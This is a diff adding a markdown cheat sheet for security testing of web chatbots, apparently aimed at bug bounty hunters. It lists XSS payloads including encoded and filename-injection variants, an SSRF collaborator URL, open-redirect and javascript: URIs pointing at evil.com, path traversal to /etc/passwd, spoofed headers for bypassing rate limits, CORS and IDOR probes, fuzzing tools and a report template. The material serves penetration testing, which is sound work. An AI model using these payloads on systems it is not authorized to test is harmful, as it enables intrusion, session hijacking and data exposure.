@@ -1,0 +1,244 @@
+# Chatbot Security Testing — Complete Methodology & Payloads
+
+# Recon and Entry Points
+Identify:
+
+- File upload functionality
+
+- Chat message input fields
+
+- Links being sent or received
+
+- Authentication state (guest, user, admin)
+
+- Backend API requests used for chat
+
+- Capture full chat API request using Burp Suite or ZAP
+
+# 🐞 2️⃣ Vulnerability Classes & Payloads
+A. Stored XSS in Messages
+-----Basic Payloads----
+
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+
+-----Bypass Payloads----
+
+"><svg/onload=alert(document.domain)>
+"><img src=x onerror=alert(1)>
+"><iframe src=javascript:alert(1)>
+  
+Unicode Based
+
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+HTML Encoding
+
+html
+Copy
+Edit
+&lt;script&gt;alert(1)&lt;/script&gt;
+Double Encoded
+
+html
+Copy
+Edit
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+CSS Injection
+
+css
+Copy
+Edit
+<style>@import 'javascript:alert(1)';</style>
+B. Stored XSS via File Upload
+Test Points:
+File name:
+
+bash
+Copy
+Edit
+"><script>alert(1)</script>.pdf
+test"><img src=x onerror=alert(1)>.png
+PDF Metadata:
+
+Title
+
+Author
+
+Subject
+
+Malicious Files:
+SVG file (high chance of XSS)
+
+xml
+Copy
+Edit
+
+Polyglot Files (.html disguised as .pdf, .docx etc.)
+
+Mime Type Confusion:
+Upload HTML file and rename to PDF.
+
+Observe if backend parses content.
+
+C. SSRF via Chatbot External Links
+Payload:
+
+cpp
+Copy
+Edit
+http://<your-burpcollaborator-url>
+Headers to manipulate:
+
+Host
+
+Origin
+
+Referer
+
+Test for:
+
+Outbound DNS/HTTP requests
+
+Internal network SSRF
+
+D. Open Redirect via Message Hyperlinks
+Payload:
+
+javascript
+Copy
+Edit
+https://evil.com
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+Test If:
+
+Redirect links are sanitized.
+
+Embedded protocols are allowed (javascript: / data:).
+
+E. Directory Traversal via File Upload
+Payloads:
+
+perl
+Copy
+Edit
+../../../../etc/passwd
+..%2f..%2f..%2f..%2fetc/passwd
+F. Rate Limiting Bypass
+Use Burp Intruder to brute force chat API
+
+Headers to manipulate:
+
+X-Forwarded-For
+
+True-Client-IP
+
+CF-Connecting-IP
+
+Forwarded: for=127.0.0.1
+
+Randomize IPs to bypass WAF/CDN limits
+
+bash
+Copy
+Edit
+X-Forwarded-For: 127.0.0.1, 8.8.8.8
+Try:
+
+Removing Cookies
+
+Changing User-Agent
+
+G. CORS Misconfiguration
+Test using Burp Collaborator:
+
+Add header:
+
+arduino
+Copy
+Edit
+Origin: https://evil.com
+Observe if:
+
+Access-Control-Allow-Origin: *
+
+Sensitive data returned
+
+H. IDOR (Insecure Direct Object Reference)
+Capture file upload response IDs:
+
+bash
+Copy
+Edit
+https://chat.site.com/file-upload/abc123/file.pdf
+Attempt accessing nearby IDs:
+
+nginx
+Copy
+Edit
+abc124
+abc125
+Check whether authentication is enforced on file access.
+
+I. DOM Based XSS
+Observe chat UI JavaScript code using DevTools.
+
+Inject payloads into message text to trigger client-side reflections.
+
+Payload:
+
+bash
+Copy
+Edit
+"><svg/onload=alert(1)>
+J. Logic Bugs
+Abuse chatbot workflows:
+
+Send invalid file types.
+
+Send empty or null message bodies.
+
+Abuse long text spam (>5000 chars).
+
+Send invalid JSON.
+
+Observe error behavior.
+
+🚀 3️⃣ Automation Tips
+Use Burp Intruder for mass-fuzzing.
+
+Use FFUF for file ID enumeration.
+
+Use Kiterunner for API endpoint fuzzing.
+
+Use Upload Scanner Burp Extension for file upload attacks.
+
+Use Corsy for automated CORS testing.
+
+📈 4️⃣ Reporting Template
+Whenever you find something, you can follow this template for easy reporting:
+
+markdown
+Copy
+Edit
+Title: Stored XSS via Chatbot File Upload
+
+Summary:
+Chatbot file upload feature allows execution of JavaScript payload via filename or metadata. This can lead to stored XSS when internal agents preview the file.
+
+Steps to Reproduce:
+1. Upload file with embedded payload.
+2. Access file preview page.
+3. JavaScript executes.
+
+Payload Used:
+"><script>alert(1)</script>
+
+Impact:
+- Account Takeover
+- Internal Staff compromise
+- Session hijacking
+
+Severity: High
+✅ DONE.
